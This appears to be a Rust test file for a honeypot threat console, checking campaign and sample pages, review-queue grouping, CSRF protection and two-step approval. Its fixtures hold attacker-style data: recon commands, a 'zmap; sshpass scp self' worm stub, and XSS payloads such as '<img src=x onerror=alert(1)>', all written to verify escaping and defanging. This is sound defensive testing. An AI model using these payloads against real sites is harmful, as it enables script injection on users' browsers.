//! The campaign pages, the campaign context on the review queue, the IP and Samples pages, and the
//! two-step campaign approval, against a database the real campaign indexer filled.
//!
//! A test binary of its own because the sample pages read `PROPOLIS_SPOOL_ROOT`, a process
//! environment variable, and nothing else in this binary reads the environment.

use std::net::SocketAddr;
use std::sync::Arc;

use axum::Router;
use axum::body::Body;
use axum::extract::connect_info::MockConnectInfo;
use axum::http::{Request, StatusCode};
use chrono::{DateTime, Duration, TimeZone, Utc};
use console::auth::{self, PasswordStore, RateLimiter, SessionStore};
use console::{AppState, routes};
use core_scoring::{EventInput, Protocol, SignalType, append_event};
use http_body_util::BodyExt;
use review::campaign::{self, BatchOutcome};
use sha2::{Digest, Sha256};
use sqlx::PgPool;
use tower::ServiceExt;
use uuid::Uuid;

mod markup;

fn state(db: PgPool) -> AppState {
    AppState {
        db,
        sessions: Arc::new(SessionStore::new([9u8; 32])),
        passwords: Arc::new(PasswordStore::new("campaigns-test")),
        login_rate_limiter: Arc::new(RateLimiter::default()),
        templates: Arc::new(console::templates::environment()),
        geoip: Arc::new(geoip::GeoIp::disabled()),
        rdns: Arc::new(console::rdns::RdnsResolver::disabled()),
        feed_output_dir: None,
        fleet_listeners: Arc::new(Vec::new()),
        fleet_probe_interval: std::time::Duration::from_secs(300),
        deploy_stamp_path: None,
        startup_time: Utc::now(),
        binary_name: "console",
        version: "test",
        git_sha: "abc123abc123",
        built_at: "2026-10-07T00:00:00Z",
        log_buffer: Arc::new(console::log_buffer::LogBuffer::new(10)),
        events_ingested: Arc::new(std::sync::atomic::AtomicU64::new(0)),
        events_rejected: Arc::new(std::sync::atomic::AtomicU64::new(0)),
        trusted_proxy: false,
        metrics_token: None,
        gave_up_subsystems: console::no_subsystem_health(),
        intake_lag: console::intake_lag::no_intake_lag(),
    }
}

struct Console {
    state: AppState,
    session: String,
    cookie: String,
}

impl Console {
    fn new(pool: PgPool) -> Self {
        let state = state(pool);
        let (session, cookie) = state.sessions.create();
        Self {
            state,
            session,
            cookie: format!("{}={cookie}", auth::SESSION_COOKIE),
        }
    }

    fn app(&self) -> Router {
        routes::router(self.state.clone())
            .layer(MockConnectInfo(SocketAddr::from(([127, 0, 0, 1], 5555))))
    }

    fn csrf(&self) -> String {
        self.state.sessions.generate_csrf(&self.session).unwrap()
    }

    async fn get(&self, uri: &str) -> (StatusCode, String) {
        let response = self
            .app()
            .oneshot(
                Request::builder()
                    .uri(uri)
                    .header("cookie", &self.cookie)
                    .body(Body::empty())
                    .unwrap(),
            )
            .await
            .unwrap();
        let status = response.status();
        let body = response.into_body().collect().await.unwrap().to_bytes();
        (status, readable(&body))
    }

    async fn post(&self, uri: &str, form: &[(&str, &str)]) -> (StatusCode, String) {
        let body: String = form
            .iter()
            .map(|(k, v)| format!("{k}={}", urlencode(v)))
            .collect::<Vec<_>>()
            .join("&");
        let response = self
            .app()
            .oneshot(
                Request::builder()
                    .method("POST")
                    .uri(uri)
                    .header("cookie", &self.cookie)
                    .header("content-type", "application/x-www-form-urlencoded")
                    .body(Body::from(body))
                    .unwrap(),
            )
            .await
            .unwrap();
        let status = response.status();
        let body = response.into_body().collect().await.unwrap().to_bytes();
        (status, readable(&body))
    }
}

/// The page with minijinja's escaped slash turned back into a slash, so assertions can name
/// paths and commands as written. No other entity is touched, so an escaped `<` stays escaped and
/// the escaping assertions keep their meaning.
fn readable(body: &[u8]) -> String {
    String::from_utf8(body.to_vec())
        .unwrap()
        .replace("&#x2f;", "/")
}

fn urlencode(s: &str) -> String {
    s.bytes()
        .map(|b| match b {
            b'A'..=b'Z' | b'a'..=b'z' | b'0'..=b'9' | b'-' | b'.' | b'_' => (b as char).to_string(),
            _ => format!("%{b:02X}"),
        })
        .collect()
}

async fn migrate(pool: &PgPool) {
    sqlx::migrate!("../core-scoring/migrations")
        .run(pool)
        .await
        .unwrap();
    review::migrator().run(pool).await.unwrap();
    fleet::migrator().run(pool).await.unwrap();
}

/// Six hours ago, on the hour, so the few minutes of fixture events never straddle a day.
fn t0() -> DateTime<Utc> {
    let hour = (Utc::now() - Duration::hours(6)).timestamp() / 3600 * 3600;
    Utc.timestamp_opt(hour, 0).unwrap()
}

async fn append(
    pool: &PgPool,
    ip: &str,
    sensor: &str,
    signal: SignalType,
    at: DateTime<Utc>,
    metadata: serde_json::Value,
    session: Option<Uuid>,
) {
    append_event(
        pool,
        EventInput::from_signal(
            ip.parse().unwrap(),
            None,
            sensor.into(),
            signal,
            Protocol::Tcp,
            true,
            at,
            metadata,
            session,
        ),
    )
    .await
    .unwrap();
}

async fn index_all(pool: &PgPool) {
    while campaign::index_batch(pool, 500).await.unwrap() != BatchOutcome::Indexed(0) {}
}

async fn pend(pool: &PgPool, ip: &str) {
    sqlx::query(
        "INSERT INTO review_queue (source_ip, score_at_surface, categories_at_surface) \
         VALUES ($1::inet, 50, '{}'::jsonb) ON CONFLICT (source_ip) DO NOTHING",
    )
    .bind(ip)
    .execute(pool)
    .await
    .unwrap();
}

async fn review_state(pool: &PgPool, ip: &str) -> String {
    sqlx::query_scalar("SELECT state::text FROM review_queue WHERE source_ip = $1::inet")
        .bind(ip)
        .fetch_one(pool)
        .await
        .unwrap()
}

/// Five hosts upload the same body (a sample campaign); three of them run the same command
/// script (a command-sequence campaign). Returns the sample's digest.
async fn seed(pool: &PgPool, worm_body: &[u8]) -> String {
    let sha: String = Sha256::digest(worm_body)
        .iter()
        .map(|b| format!("{b:02x}"))
        .collect();
    for i in 1..=5 {
        let ip = format!("192.0.2.{i}");
        let session = Uuid::now_v7();
        let start = t0() + Duration::minutes(i);
        if i <= 3 {
            for (n, c) in [
                "uname -a",
                "cat /proc/cpuinfo | grep name",
                "cd /tmp; cat > w.sh",
            ]
            .iter()
            .enumerate()
            {
                append(
                    pool,
                    &ip,
                    "ssh",
                    SignalType::HoneypotCommandExec,
                    start + Duration::seconds(n as i64),
                    serde_json::json!({ "command": c }),
                    Some(session),
                )
                .await;
            }
        }
        append(
            pool,
            &ip,
            "ssh",
            SignalType::HoneypotMalwareUpload,
            start + Duration::seconds(5),
            serde_json::json!({ "sample_sha256": sha, "sample_orig_name": "w.sh" }),
            Some(session),
        )
        .await;
    }
    // Later ssh traffic ends the sessions' runs.
    append(
        pool,
        "198.51.100.200",
        "ssh",
        SignalType::HoneypotConnection,
        t0() + Duration::hours(2),
        serde_json::json!({}),
        None,
    )
    .await;
    index_all(pool).await;
    sha
}

async fn campaign_id(pool: &PgPool, kind: &str) -> i64 {
    sqlx::query_scalar("SELECT id FROM campaign WHERE kind = $1")
        .bind(kind)
        .fetch_one(pool)
        .await
        .unwrap()
}

#[sqlx::test(migrations = false)]
async fn the_campaign_list_shows_each_campaign_with_its_hosts_and_activity(pool: PgPool) {
    migrate(&pool).await;
    let sha = seed(&pool, b"#!/bin/sh\necho worm\n").await;
    let console = Console::new(pool.clone());
    let (status, page) = console.get("/campaigns").await;
    assert_eq!(status, StatusCode::OK);
    let sample = campaign_id(&pool, "sample").await;
    let sequence = campaign_id(&pool, "command_sequence").await;
    // The same-sample campaign is not a row; its sample is the command sequence's "delivers".
    assert!(
        !page.contains(&format!("href=\"/campaigns/{sample}\"")),
        "{page}"
    );
    assert!(page.contains(&format!("href=\"/campaigns/{sequence}\"")));
    assert!(!page.contains(&format!("sample {} (w.sh)", &sha[..12])));
    assert!(
        page.contains(">uname -a ; cat /proc/cpuinfo | grep name ; cd /tmp; cat &gt; w.sh</a>"),
        "{page}"
    );
    assert!(
        page.contains("<span class=\"dim\">3 commands</span>"),
        "{page}"
    );
    // The command sequence's three hosts, all seen today, make one full-height bar.
    assert!(
        page.contains("3<span class=\"c-unit\"> hosts</span>"),
        "{page}"
    );
    assert!(
        page.contains(&format!(" s1\" title=\"{}: 3\"", t0().date_naive())),
        "{page}"
    );
    assert!(page.contains(&format!("href=\"/samples/{sha}\"")));

    let (_, filtered) = console.get("/campaigns?kind=scan").await;
    assert!(!filtered.contains(&format!("href=\"/campaigns/{sequence}\"")));
    assert!(filtered.contains("no campaigns of this kind yet"));
}

#[sqlx::test(migrations = false)]
async fn attacker_text_is_rendered_escaped_and_never_as_a_link(pool: PgPool) {
    migrate(&pool).await;
    let sha = seed(&pool, b"#!/bin/sh\necho worm two\n").await;
    let sample = campaign_id(&pool, "sample").await;
    sqlx::query("UPDATE campaign SET label = '<script>alert(1)</script>' WHERE id = $1")
        .bind(sample)
        .execute(&pool)
        .await
        .unwrap();
    // The list shows the command sequence's label in a link, its `title` and a cell.
    sqlx::query(
        "UPDATE campaign SET label = '9 commands: <script>alert(1)</script> \"><img src=x onerror=alert(3)>' \
         WHERE kind = 'command_sequence'",
    )
    .execute(&pool)
    .await
    .unwrap();
    sqlx::query(
        "INSERT INTO ioc (kind, value, detail, artifact_sha256, first_seen, last_seen) \
         VALUES ('url', 'http://198.51.100.9/\"><img src=x onerror=alert(2)>', '<b>bold</b>', $1, now(), now())",
    )
    .bind(&sha)
    .execute(&pool)
    .await
    .unwrap();
    sqlx::query("INSERT INTO ioc_artifact_scan (sha256, state) VALUES ($1, 'done') ON CONFLICT (sha256) DO UPDATE SET state = 'done'")
        .bind(&sha)
        .execute(&pool)
        .await
        .unwrap();
    let console = Console::new(pool.clone());
    let (_, list) = console.get("/campaigns").await;
    assert!(
        list.contains(
            "&lt;script&gt;alert(1)&lt;/script&gt; &quot;&gt;&lt;img src=x onerror=alert(3)&gt;"
        ),
        "{list}"
    );
    assert!(!list.contains("<img src=x onerror=alert(3)"), "{list}");
    assert!(!list.contains("\"><img"), "{list}");
    for uri in [
        "/campaigns".to_string(),
        "/campaigns?single=1".to_string(),
        "/samples".to_string(),
        format!("/campaigns/{sample}"),
        format!("/samples/{sha}"),
    ] {
        let (status, page) = console.get(&uri).await;
        assert_eq!(status, StatusCode::OK, "{uri}");
        assert!(!page.contains("<script>alert(1)"), "{uri}: unescaped label");
        assert!(!page.contains("<img src=x"), "{uri}: unescaped indicator");
        assert!(!page.contains("<b>bold"), "{uri}: unescaped detail");
        assert!(
            !page.contains("href=\"http://198.51.100.9"),
            "{uri}: an indicator became a link"
        );
    }
    let (_, detail) = console.get(&format!("/campaigns/{sample}")).await;
    assert!(detail.contains("&lt;script&gt;alert(1)&lt;/script&gt;"));
    assert!(
        detail.contains("&lt;img src=x onerror=alert(2)&gt;"),
        "{detail}"
    );
}

#[sqlx::test(migrations = false)]
async fn the_raw_form_of_xor_encoded_lines_is_shown_escaped(pool: PgPool) {
    migrate(&pool).await;
    seed(&pool, b"#!/bin/sh\necho xor\n").await;
    let sequence = campaign_id(&pool, "command_sequence").await;
    sqlx::query(
        "UPDATE campaign SET representative = representative || \
         '{\"encoded\": [{\"raw\": \"lghkel<b>\", \"key\": 9, \"decoded\": \"enable\"}]}'::jsonb \
         WHERE id = $1",
    )
    .bind(sequence)
    .execute(&pool)
    .await
    .unwrap();
    let console = Console::new(pool.clone());
    let (status, page) = console.get(&format!("/campaigns/{sequence}")).await;
    assert_eq!(status, StatusCode::OK);
    assert!(page.contains("lghkel&lt;b&gt;"), "{page}");
    assert!(page.contains("sent XOR-encoded, key 9"), "{page}");
    assert!(!page.contains("lghkel<b>"));
}

#[sqlx::test(migrations = false)]
async fn the_campaign_page_shows_members_representative_and_indicators(pool: PgPool) {
    migrate(&pool).await;
    let sha = seed(
        &pool,
        b"#!/bin/sh\necho \"127.0.0.1 rival.example.net\" >> /etc/hosts\n",
    )
    .await;
    let spool = tempfile::tempdir().unwrap();
    std::fs::create_dir_all(spool.path().join("ssh")).unwrap();
    std::fs::write(
        spool.path().join("ssh").join(&sha),
        b"#!/bin/sh\necho \"127.0.0.1 rival.example.net\" >> /etc/hosts\n",
    )
    .unwrap();
    campaign::scan_artifacts(&pool, &[("ssh", spool.path().join("ssh"))])
        .await
        .unwrap();
    pend(&pool, "192.0.2.2").await;
    let sequence = campaign_id(&pool, "command_sequence").await;
    let sample = campaign_id(&pool, "sample").await;
    let console = Console::new(pool.clone());

    let (status, page) = console.get(&format!("/campaigns/{sequence}")).await;
    assert_eq!(status, StatusCode::OK);
    for ip in ["192.0.2.1", "192.0.2.2", "192.0.2.3"] {
        assert!(page.contains(&format!("href=\"/ip/{ip}\"")), "{ip}");
    }
    assert!(!page.contains("href=\"/ip/192.0.2.4\""));
    assert!(
        page.contains("<li>cat /proc/cpuinfo | grep name</li>"),
        "{page}"
    );
    assert!(
        page.contains(&format!("href=\"/samples/{sha}\"")),
        "the uploaded sample is linked"
    );
    assert!(page.contains("1 member is pending review"), "{page}");
    assert!(page.contains(&format!("href=\"/campaigns/{sequence}/approve\"")));

    let (_, page) = console.get(&format!("/campaigns/{sample}")).await;
    // Shown defanged, the live value only behind the explicit "copy original" action.
    assert!(
        page.contains("<code class=\"ioc-value\">127[.]0[.]0[.]1 rival[.]example[.]net</code>"),
        "{page}"
    );
    assert!(page.contains("data-copy=\"127[.]0[.]0[.]1 rival[.]example[.]net\""));
    assert!(page.contains("data-copy=\"127.0.0.1 rival.example.net\""));
    assert!(page.contains(">copy original</button>"));
    assert!(page.contains("hosts entry"));

    // One indicator carried by three members' commands is one row, not three.
    for (n, ip) in ["192.0.2.1", "192.0.2.2", "192.0.2.3"].iter().enumerate() {
        sqlx::query(
            "INSERT INTO ioc (kind, value, detail, event_id, source_ip, first_seen, last_seen, \
                              sightings) \
             VALUES ('url', 'http://198.51.100.70/kswpad', '198.51.100.70', $1, $2::inet, now(), \
                     now(), 2)",
        )
        .bind(1000 + n as i64)
        .bind(ip)
        .execute(&pool)
        .await
        .unwrap();
    }
    let (_, page) = console.get(&format!("/campaigns/{sequence}")).await;
    assert_eq!(
        page.matches("http://198.51.100.70/kswpad").count(),
        1,
        "{page}"
    );
    assert!(
        page.contains("3 hosts, <span class=\"run-count\">x6</span>"),
        "{page}"
    );
    assert!(
        page.contains("<code class=\"ioc-value\">hxxp://198[.]51[.]100[.]70/kswpad</code>"),
        "{page}"
    );
    assert!(
        !page.contains("href=\"http://198.51.100.70"),
        "an indicator is never a link"
    );
    assert!(page.contains("event 1000"), "{page}");

    let (status, _) = console.get("/campaigns/999999").await;
    assert_eq!(status, StatusCode::NOT_FOUND);
}

/// The approval is two steps and approves exactly the confirmed, still-pending members: never a
/// member that became pending after the confirmation was shown, never a confirmed address that is
/// not a member, never without the CSRF token.
#[sqlx::test(migrations = false)]
async fn approving_a_campaign_confirms_the_list_first_and_approves_only_it(pool: PgPool) {
    migrate(&pool).await;
    seed(&pool, b"#!/bin/sh\necho worm three\n").await;
    let sample = campaign_id(&pool, "sample").await;
    for ip in ["192.0.2.1", "192.0.2.2", "192.0.2.3"] {
        pend(&pool, ip).await;
    }
    // Pending, but not a member of the campaign.
    pend(&pool, "203.0.113.77").await;
    let console = Console::new(pool.clone());

    let (status, page) = console.get(&format!("/campaigns/{sample}/approve")).await;
    assert_eq!(status, StatusCode::OK);
    assert!(
        page.contains("These 3 pending addresses will be approved"),
        "{page}"
    );
    assert!(
        page.contains("value=\"192.0.2.1,192.0.2.2,192.0.2.3\""),
        "{page}"
    );
    assert!(!page.contains("203.0.113.77"));
    // Showing the confirmation decided nothing.
    for ip in ["192.0.2.1", "192.0.2.2", "192.0.2.3"] {
        assert_eq!(review_state(&pool, ip).await, "pending");
    }

    // A member that becomes pending after the page was rendered.
    pend(&pool, "192.0.2.4").await;

    let uri = format!("/campaigns/{sample}/approve");
    let confirmed = "192.0.2.1,192.0.2.2,192.0.2.3,203.0.113.77";
    let (status, _) = console
        .post(&uri, &[("csrf_token", "forged"), ("ips", confirmed)])
        .await;
    assert_eq!(status, StatusCode::FORBIDDEN);
    assert_eq!(review_state(&pool, "192.0.2.1").await, "pending");

    let (status, _) = console
        .post(
            &uri,
            &[
                ("csrf_token", &console.csrf()),
                ("ips", "192.0.2.1,not-an-address"),
            ],
        )
        .await;
    assert_eq!(status, StatusCode::BAD_REQUEST);
    assert_eq!(review_state(&pool, "192.0.2.1").await, "pending");

    let (status, page) = console
        .post(
            &uri,
            &[
                ("csrf_token", &console.csrf()),
                ("ips", confirmed),
                ("notes", "worm wave"),
            ],
        )
        .await;
    assert_eq!(status, StatusCode::OK);
    assert!(page.contains("Approved 3 addresses"), "{page}");
    assert!(page.contains("Skipped 1"), "{page}");
    for ip in ["192.0.2.1", "192.0.2.2", "192.0.2.3"] {
        assert_eq!(review_state(&pool, ip).await, "approved", "{ip}");
    }
    assert_eq!(
        review_state(&pool, "192.0.2.4").await,
        "pending",
        "joined after confirmation"
    );
    assert_eq!(
        review_state(&pool, "203.0.113.77").await,
        "pending",
        "not a member"
    );
    let notes: String =
        sqlx::query_scalar("SELECT notes FROM review_queue WHERE source_ip = '192.0.2.1'")
            .fetch_one(&pool)
            .await
            .unwrap();
    assert_eq!(notes, "worm wave");
}

#[sqlx::test(migrations = false)]
async fn queue_ip_and_samples_pages_link_to_the_campaign(pool: PgPool) {
    migrate(&pool).await;
    let root = tempfile::tempdir().unwrap();
    // SAFETY: set before anything reads it, and nothing else in this binary reads the environment.
    unsafe { std::env::set_var("PROPOLIS_SPOOL_ROOT", root.path()) };
    let body = b"#!/bin/sh\necho worm four\n";
    let sha = seed(&pool, body).await;
    std::fs::create_dir_all(root.path().join("ssh")).unwrap();
    std::fs::write(root.path().join("ssh").join(&sha), body).unwrap();
    for ip in ["192.0.2.1", "192.0.2.2"] {
        pend(&pool, ip).await;
    }
    let sample = campaign_id(&pool, "sample").await;
    let console = Console::new(pool.clone());

    let (status, queue) = console.get("/queue").await;
    assert_eq!(status, StatusCode::OK);
    // Two pending members make a group whose header links the campaign and its approval.
    assert!(
        queue.contains(&format!(
            "<a href=\"/campaigns/{sample}\">campaign {sample}</a>"
        )),
        "{queue}"
    );
    assert!(queue.contains(&format!(
        "<a class=\"qg-approve\" href=\"/campaigns/{sample}/approve\">Approve all 2"
    )));

    let (status, ip_page) = console.get("/ip/192.0.2.1").await;
    assert_eq!(status, StatusCode::OK);
    assert!(
        ip_page.contains(&format!("<a href=\"/campaigns/{sample}\">")),
        "{ip_page}"
    );
    assert!(ip_page.contains("5 hosts"));

    // A second file in the spool that nothing ever referenced.
    let lone = b"#!/bin/sh\necho nobody sent this\n";
    let lone_sha: String = Sha256::digest(lone)
        .iter()
        .map(|b| format!("{b:02x}"))
        .collect();
    std::fs::write(root.path().join("ssh").join(&lone_sha), lone).unwrap();
    let sequence = campaign_id(&pool, "command_sequence").await;

    let (status, samples) = console.get("/samples").await;
    assert_eq!(status, StatusCode::OK);
    assert!(samples.contains(&format!("href=\"/samples/{sha}\"")));
    let row = between(
        &samples,
        &format!("href=\"/samples/{sha}\" title="),
        "</tr>",
    );
    assert!(
        row.contains(&format!(
            "<a href=\"/campaigns/{sample}\">5<span class=\"c-unit\"> hosts</span></a>"
        )),
        "host count links the sample's own campaign: {row}"
    );
    assert!(
        row.contains(&format!(" s1\" title=\"{}: 5\"", t0().date_naive())),
        "the hosts-per-day sparkline: {row}"
    );
    assert!(row.contains("UTC"), "the Active cell: {row}");
    assert!(
        row.contains(&format!("<a href=\"/campaigns/{sequence}\""))
            && row.contains(&format!(">campaign {sequence}</a>")),
        "delivered by the command sequence that uploaded it: {row}"
    );
    // A file nobody linked has no host count, no activity and no campaign.
    let lone_row = between(
        &samples,
        &format!("href=\"/samples/{lone_sha}\" title="),
        "</tr>",
    );
    assert!(lone_row.contains("not linked"), "{lone_row}");
    assert!(!lone_row.contains("/campaigns/"), "{lone_row}");
    assert!(!lone_row.contains("class=\"strip\""), "{lone_row}");
    assert!(
        samples
            .find(&format!("href=\"/samples/{sha}\" title="))
            .unwrap()
            < samples
                .find(&format!("href=\"/samples/{lone_sha}\" title="))
                .unwrap(),
        "the most widely delivered file sorts first"
    );

    let (status, detail) = console.get(&format!("/samples/{sha}")).await;
    assert_eq!(status, StatusCode::OK);
    assert!(detail.contains("in the ssh spool"), "{detail}");
    assert!(detail.contains("queued for scanning"));
    let (status, _) = console.get("/samples/not-a-digest").await;
    assert_eq!(status, StatusCode::BAD_REQUEST);
}

#[sqlx::test(migrations = false)]
async fn a_self_propagating_sample_calls_its_members_infected_hosts(pool: PgPool) {
    migrate(&pool).await;
    seed(&pool, b"zmap; sshpass scp self\n").await;
    let sample = campaign_id(&pool, "sample").await;
    let console = Console::new(pool.clone());
    let (_, page) = console.get(&format!("/campaigns/{sample}")).await;
    assert!(
        page.contains("treated as: <strong>attacker</strong>"),
        "{page}"
    );
    sqlx::query("UPDATE campaign SET self_propagating = TRUE WHERE id = $1")
        .bind(sample)
        .execute(&pool)
        .await
        .unwrap();
    let (_, page) = console.get(&format!("/campaigns/{sample}")).await;
    assert!(
        page.contains("treated as: <strong>infected host</strong>"),
        "{page}"
    );
    let (_, list) = console.get("/campaigns").await;
    assert!(list.contains(">worm</span>"));
}

/// The text of `page` from the first `start` to the next `end` after it.
fn between<'a>(page: &'a str, start: &str, end: &str) -> &'a str {
    let from = page
        .find(start)
        .unwrap_or_else(|| panic!("`{start}` not in page: {page}"));
    let rest = &page[from..];
    let to = rest
        .find(end)
        .unwrap_or_else(|| panic!("`{end}` not after `{start}`: {page}"));
    &rest[..to]
}

/// The hidden CSRF token the rendered row for `ip` carries.
fn row_csrf(page: &str, ip: &str) -> String {
    let row = between(page, &format!("id=\"row-{ip}\""), "</tr>");
    between(row, "name=\"csrf_token\" value=\"", "\">")
        .trim_start_matches("name=\"csrf_token\" value=\"")
        .to_string()
}

#[sqlx::test(migrations = false)]
async fn pending_members_of_one_campaign_form_one_group_and_singles_stay_rows(pool: PgPool) {
    migrate(&pool).await;
    seed(&pool, b"#!/bin/sh\necho worm five\n").await;
    let sample = campaign_id(&pool, "sample").await;
    let sequence = campaign_id(&pool, "command_sequence").await;
    // 192.0.2.1-3 belong to the sample campaign (5 hosts) AND the command-sequence campaign
    // (3 hosts), each with 3 pending: the pending counts tie, so the larger campaign is the home.
    for ip in ["192.0.2.1", "192.0.2.2", "192.0.2.3", "198.51.100.200"] {
        pend(&pool, ip).await;
    }
    let console = Console::new(pool.clone());
    let (status, page) = console.get("/queue").await;
    assert_eq!(status, StatusCode::OK);

    assert_eq!(page.matches("class=\"queue-group\"").count(), 1, "{page}");
    assert!(page.contains(&format!("id=\"group-{sample}\"")), "{page}");
    assert!(
        !page.contains(&format!("id=\"group-{sequence}\"")),
        "an address is listed under one home campaign only: {page}"
    );
    // Ends at the member table's close: the rows hold <details> of their own.
    let group = between(&page, "<details class=\"qgroup\">", "</table>");
    for ip in ["192.0.2.1", "192.0.2.2", "192.0.2.3"] {
        assert!(
            group.contains(&format!("id=\"row-{ip}\"")),
            "{ip} not in group"
        );
    }
    assert!(
        group.contains("<span class=\"run-count\">3 pending</span>"),
        "{group}"
    );
    assert!(group.contains("5 hosts"), "{group}");
    assert!(
        group.contains(&format!(
            "<a class=\"qg-approve\" href=\"/campaigns/{sample}/approve\">Approve all 3"
        )),
        "{group}"
    );
    assert!(
        !group.contains("part of <a"),
        "a member line must not repeat its group's campaign: {group}"
    );
    // The address in no campaign is a plain row, outside the group.
    assert!(!group.contains("198.51.100.200"));
    assert_eq!(
        page.matches("id=\"row-198.51.100.200\"").count(),
        1,
        "{page}"
    );
}

#[sqlx::test(migrations = false)]
async fn a_lone_pending_member_stays_a_row_with_its_campaign_link(pool: PgPool) {
    migrate(&pool).await;
    seed(&pool, b"#!/bin/sh\necho worm six\n").await;
    let sample = campaign_id(&pool, "sample").await;
    pend(&pool, "192.0.2.4").await;
    let console = Console::new(pool.clone());
    let (_, page) = console.get("/queue").await;
    assert!(!page.contains("class=\"queue-group\""), "{page}");
    assert!(page.contains("id=\"row-192.0.2.4\""));
    assert!(
        page.contains(&format!(
            "part of <a href=\"/campaigns/{sample}\">campaign {sample}</a>, 5 hosts"
        )),
        "{page}"
    );
    assert!(
        !page.contains("approve all"),
        "one pending member has nothing to approve together"
    );
}

/// The campaign has two pending members, but only one can be listed (the other has no score
/// projection, so the page leaves it out): one row under a header would be a group of one.
#[sqlx::test(migrations = false)]
async fn a_campaign_with_one_listed_member_is_not_a_group_of_one(pool: PgPool) {
    migrate(&pool).await;
    seed(&pool, b"#!/bin/sh\necho worm ten\n").await;
    let sample = campaign_id(&pool, "sample").await;
    for ip in ["192.0.2.4", "192.0.2.5"] {
        pend(&pool, ip).await;
    }
    sqlx::query("DELETE FROM ip_score WHERE source_ip = '192.0.2.5'")
        .execute(&pool)
        .await
        .unwrap();
    let console = Console::new(pool.clone());
    let (_, page) = console.get("/queue").await;
    assert!(page.contains("id=\"row-192.0.2.4\""), "{page}");
    assert!(!page.contains("id=\"row-192.0.2.5\""), "{page}");
    assert!(!page.contains("class=\"queue-group\""), "{page}");
    assert!(
        page.contains(&format!(
            "<a href=\"/campaigns/{sample}/approve\">approve all 2 pending"
        )),
        "{page}"
    );
}

#[sqlx::test(migrations = false)]
async fn a_group_sits_where_its_top_member_does_under_the_current_sort(pool: PgPool) {
    migrate(&pool).await;
    seed(&pool, b"#!/bin/sh\necho worm seven\n").await;
    for ip in ["192.0.2.1", "192.0.2.2", "198.51.100.200"] {
        pend(&pool, ip).await;
    }
    let console = Console::new(pool.clone());
    // The group's members were first seen minutes after t0 and the single two hours after.
    let (_, oldest_first) = console.get("/queue?sort=first_seen").await;
    assert!(
        oldest_first.find("class=\"queue-group\"").unwrap()
            < oldest_first.find("id=\"row-198.51.100.200\"").unwrap(),
        "{oldest_first}"
    );
    let (_, newest_active) = console.get("/queue?sort=last_seen").await;
    assert!(
        newest_active.find("id=\"row-198.51.100.200\"").unwrap()
            < newest_active.find("class=\"queue-group\"").unwrap(),
        "{newest_active}"
    );
}

#[sqlx::test(migrations = false)]
async fn decisions_inside_a_group_use_the_same_endpoints_csrf_and_note_field(pool: PgPool) {
    migrate(&pool).await;
    seed(&pool, b"#!/bin/sh\necho worm eight\n").await;
    for ip in ["192.0.2.1", "192.0.2.2", "192.0.2.3"] {
        pend(&pool, ip).await;
    }
    let console = Console::new(pool.clone());
    let (_, page) = console.get("/queue").await;
    let group = between(&page, "<details class=\"qgroup\">", "</table>");
    let row = between(group, "id=\"row-192.0.2.1\"", "</tr>");
    for action in ["approve", "reject", "snooze"] {
        assert!(
            row.contains(&format!(
                "hx-post=\"/queue/192.0.2.1/{action}\" hx-include=\"closest tr\" hx-target=\"closest tr\" hx-swap=\"outerHTML\""
            )),
            "{action}: {row}"
        );
    }
    // The note field is inside the same row the buttons include, closed or open.
    assert!(row.contains("<details class=\"qnote\">"), "{row}");
    assert!(row.contains("<textarea name=\"notes\""), "{row}");
    let token = row_csrf(&page, "192.0.2.1");
    assert!(!token.is_empty());

    // A forged token decides nothing.
    let (status, _) = console
        .post(
            "/queue/192.0.2.2/approve",
            &[("csrf_token", "forged"), ("notes", "x")],
        )
        .await;
    assert_eq!(status, StatusCode::FORBIDDEN);
    assert_eq!(review_state(&pool, "192.0.2.2").await, "pending");

    // What the toggle's textarea posts is stored with the decision, and the answer is the row.
    let (status, answer) = console
        .post(
            "/queue/192.0.2.1/approve",
            &[("csrf_token", &token), ("notes", "checked by hand")],
        )
        .await;
    assert_eq!(status, StatusCode::OK);
    assert!(answer.contains("id=\"row-192.0.2.1\""), "{answer}");
    assert!(answer.contains("state-approved"), "{answer}");
    let notes: String =
        sqlx::query_scalar("SELECT notes FROM review_queue WHERE source_ip = '192.0.2.1'")
            .fetch_one(&pool)
            .await
            .unwrap();
    assert_eq!(notes, "checked by hand");
    for (ip, action, state) in [
        ("192.0.2.2", "reject", "rejected"),
        ("192.0.2.3", "snooze", "snoozed"),
    ] {
        let (status, _) = console
            .post(
                &format!("/queue/{ip}/{action}"),
                &[("csrf_token", &token), ("notes", "")],
            )
            .await;
        assert_eq!(status, StatusCode::OK, "{action}");
        assert_eq!(review_state(&pool, ip).await, state);
    }
}

#[sqlx::test(migrations = false)]
async fn attacker_text_in_a_group_label_and_a_context_line_is_escaped(pool: PgPool) {
    migrate(&pool).await;
    seed(&pool, b"#!/bin/sh\necho worm nine\n").await;
    let sample = campaign_id(&pool, "sample").await;
    sqlx::query("UPDATE campaign SET label = $2 WHERE id = $1")
        .bind(sample)
        .bind("<b>x</b> \"quoted\"")
        .execute(&pool)
        .await
        .unwrap();
    append(
        &pool,
        "198.51.100.50",
        "ssh",
        SignalType::HoneypotFileDownload,
        t0() + Duration::minutes(30),
        serde_json::json!({ "url": "http://203.0.113.9/\"><img src=x onerror=alert(1)>" }),
        None,
    )
    .await;
    for ip in ["192.0.2.1", "192.0.2.2", "198.51.100.50"] {
        pend(&pool, ip).await;
    }
    let console = Console::new(pool.clone());
    let (_, page) = console.get("/queue").await;
    assert!(page.contains("class=\"queue-group\""), "{page}");
    assert!(!page.contains("<b>x</b>"), "unescaped group label: {page}");
    assert!(
        page.contains("&lt;b&gt;x&lt;/b&gt; &quot;quoted&quot;"),
        "{page}"
    );
    assert!(
        !page.contains("<img src=x"),
        "unescaped context text: {page}"
    );
    assert!(
        page.contains("title=\"http://203.0.113.9/&quot;&gt;&lt;img src=x onerror=alert(1)&gt;\""),
        "the full text in the title attribute must be escaped too: {page}"
    );
}

#[sqlx::test(migrations = false)]
async fn the_active_cell_shows_a_clock_range_within_a_day_and_a_length_across_days(pool: PgPool) {
    migrate(&pool).await;
    let at = |s: &str| s.parse::<DateTime<Utc>>().unwrap();
    for (ip, first, last) in [
        (
            "203.0.113.90",
            "2026-01-05T10:58:12Z",
            "2026-01-05T18:11:40Z",
        ),
        (
            "203.0.113.91",
            "2026-01-01T09:00:00Z",
            "2026-01-04T10:00:00Z",
        ),
    ] {
        append(
            &pool,
            ip,
            "ssh",
            SignalType::HoneypotConnection,
            at(first),
            serde_json::json!({}),
            None,
        )
        .await;
        append(
            &pool,
            ip,
            "ssh",
            SignalType::HoneypotConnection,
            at(last),
